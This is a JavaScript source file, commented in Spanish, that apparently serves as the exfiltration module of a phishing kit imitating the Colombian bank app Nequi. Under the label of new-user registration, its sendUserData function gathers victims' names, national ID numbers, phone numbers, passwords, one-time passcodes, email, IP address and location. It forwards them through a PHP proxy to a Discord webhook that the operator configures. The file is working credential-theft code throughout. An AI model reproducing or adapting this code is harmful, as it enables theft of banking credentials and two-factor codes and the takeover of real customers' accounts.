// Discord Webhook Service - Reemplazo completo de PHP/Telegram
class DiscordWebhookService {
    constructor(webhookUrl) {
        this.webhookUrl = webhookUrl;
    }

    /**
     * Envía un mensaje simple a Discord
     * @param {string} content - El contenido del mensaje
     * @returns {Promise<boolean>} - True si se envió exitosamente
     */
    async sendMessage(content) {
        try {
            const payload = {
                content: content,
                username: "Captain Hook2",
                avatar_url: "https://i.imgur.com/4M34hi2.png"
            };

            // Usar el proxy PHP para evitar bloqueos CORS
            // La ruta absoluta asegura que Vercel encuentre el proxy en la raíz
            const proxyUrl = "/proxy_discord.php";

            const response = await fetch(proxyUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });

            // Discord devuelve 204 No Content en éxito
            return response.status === 204 || response.ok;
        } catch (error) {
            console.error('Error al enviar mensaje a Discord:', error);
            return false;
        }
    }

    /**
     * Envía un mensaje con formato embed (más visual)
     * @param {Object} embedData - Datos del embed
     * @returns {Promise<boolean>} - True si se envió exitosamente
     */
    async sendEmbed(embedData) {
        try {
            const payload = {
                username: "Captain Hook2",
                avatar_url: "https://i.imgur.com/4M34hi2.png",
                embeds: [{
                    title: embedData.title || "Notificación",
                    description: embedData.description || "",
                    color: embedData.color || 0xFF69B4, // Rosa Nequi
                    fields: embedData.fields || [],
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: embedData.footer || "Captain Hook2"
                    }
                }]
            };

            // Usar el proxy PHP absoluto para evitar bloqueos CORS
            const proxyUrl = "/proxy_discord.php";

            const response = await fetch(proxyUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });

            return response.status === 204 || response.ok;
        } catch (error) {
            console.error('Error al enviar embed a Discord:', error);
            return false;
        }
    }

    /**
     * Envía datos de usuario formateados
     * @param {Object} userData - Datos del usuario
     * @returns {Promise<boolean>} - True si se envió exitosamente
     */
    async sendUserData(userData) {
        const embedData = {
            title: "✅ Nuevo Usuario Registrado",
            color: 0x00FF00,
            fields: []
        };

        // Agregar campos dinámicamente según los datos disponibles
        if (userData.userName) {
            embedData.fields.push({
                name: "🆔 Nombres",
                value: userData.userName,
                inline: true
            });
        }

        if (userData.UserId) {
            embedData.fields.push({
                name: "🪪 Cédula",
                value: userData.UserId,
                inline: true
            });
        }

        if (userData.phoneNumber) {
            embedData.fields.push({
                name: "📱 Teléfono",
                value: userData.phoneNumber,
                inline: true
            });
        }

        if (userData.password) {
            embedData.fields.push({
                name: "🔑 Contraseña",
                value: userData.password,
                inline: true
            });
        }

        if (userData.otp) {
            embedData.fields.push({
                name: "🔐 OTP",
                value: userData.otp,
                inline: true
            });
        }

        if (userData.email) {
            embedData.fields.push({
                name: "📧 Email",
                value: userData.email,
                inline: true
            });
        }

        // Agregar información adicional
        embedData.fields.push({
            name: "🌐 IP",
            value: userData.ip || "No disponible",
            inline: true
        });

        embedData.fields.push({
            name: "📍 Ubicación",
            value: userData.location || "No disponible",
            inline: true
        });

        embedData.fields.push({
            name: "🖥️ User Agent",
            value: userData.userAgent || navigator.userAgent,
            inline: false
        });

        embedData.timestamp = new Date().toISOString();

        return await this.sendEmbed(embedData);
    }

    /**
     * Envía una notificación de error
     * @param {string} errorMessage - Mensaje de error
     * @param {Object} context - Contexto adicional del error
     * @returns {Promise<boolean>} - True si se envió exitosamente
     */
    async sendError(errorMessage, context = {}) {
        const embedData = {
            title: "❌ Error en el Sistema",
            description: errorMessage,
            color: 0xFF0000,
            fields: [
                {
                    name: "📅 Fecha/Hora",
                    value: new Date().toLocaleString(),
                    inline: true
                }
            ]
        };

        if (context.page) {
            embedData.fields.push({
                name: "📄 Página",
                value: context.page,
                inline: true
            });
        }

        if (context.user) {
            embedData.fields.push({
                name: "👤 Usuario",
                value: context.user,
                inline: true
            });
        }

        return await this.sendEmbed(embedData);
    }

    /**
     * Obtiene información de IP usando un servicio gratuito
     * @returns {Promise<Object>} - Información de IP
     */
    async getIPInfo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                location: `${data.city}, ${data.country_name}`
            };
        } catch (error) {
            console.error('Error obteniendo información de IP:', error);
            return {
                ip: 'No disponible',
                location: 'No disponible'
            };
        }
    }
}

// Función para obtener el webhook configurado
function getConfiguredWebhook() {
    // Primero intentar cargar desde la configuración centralizada
    if (window.DISCORD_WEBHOOK_CONFIG &&
        window.DISCORD_WEBHOOK_CONFIG.webhookUrl &&
        !window.DISCORD_WEBHOOK_CONFIG.webhookUrl.includes('YOUR_WEBHOOK_ID')) {
        console.log('✅ Usando webhook desde configuración centralizada');
        return window.DISCORD_WEBHOOK_CONFIG.webhookUrl;
    }

    // Si no hay configuración centralizada, intentar localStorage (para desarrollo)
    try {
        const savedWebhook = localStorage.getItem('discordWebhookUrl');
        if (savedWebhook && savedWebhook.includes('discord.com/api/webhooks/')) {
            console.log('⚠️ Usando webhook desde localStorage (modo desarrollo)');
            return savedWebhook;
        }
    } catch (error) {
        console.error('Error al cargar webhook desde localStorage:', error);
    }

    console.error('❌ No se encontró webhook configurado');
    console.error('Por favor, configura tu webhook en js/discord-config.js');
    return null;
}

// Crear instancia global del servicio
const DISCORD_WEBHOOK_URL = getConfiguredWebhook() || 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';

if (!getConfiguredWebhook()) {
    console.error('⚠️ IMPORTANTE: No se ha configurado el webhook de Discord.');
    console.error('Por favor, edita js/discord-config.js y configura tu webhook.');
}

const discordService = new DiscordWebhookService(DISCORD_WEBHOOK_URL);

// Exportar para uso en otros archivos
window.discordService = discordService;

// Función para verificar si el webhook está configurado correctamente
window.isDiscordConfigured = function () {
    const webhook = getConfiguredWebhook();
    return webhook && !webhook.includes('YOUR_WEBHOOK_ID');
};

// Función para obtener información de configuración
window.getDiscordConfigInfo = function () {
    const configured = window.isDiscordConfigured();
    const source = window.DISCORD_WEBHOOK_CONFIG &&
        !window.DISCORD_WEBHOOK_CONFIG.webhookUrl.includes('YOUR_WEBHOOK_ID')
        ? 'centralizada' : 'localStorage';

    return {
        configured: configured,
        source: configured ? source : 'no configurado',
        webhook: configured ? getConfiguredWebhook().substring(0, 50) + '...' : null
    };
};

